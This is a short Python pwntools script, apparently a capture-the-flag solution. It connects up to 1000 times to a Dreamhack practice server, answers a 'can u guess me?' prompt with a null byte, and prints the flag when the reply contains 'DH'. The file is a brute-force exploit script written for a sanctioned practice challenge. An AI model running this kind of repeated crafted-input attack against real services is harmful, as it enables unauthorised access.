from pwn import *


for i in range(1000):
    p = remote("host8.dreamhack.games", 18814)
    p.recvuntil(b"can u guess me?\n")
    p.send(b"\0")
    result = p.recv(100)
    p.close()
    if b"DH" in result:
        print("FLAG:", result)
        break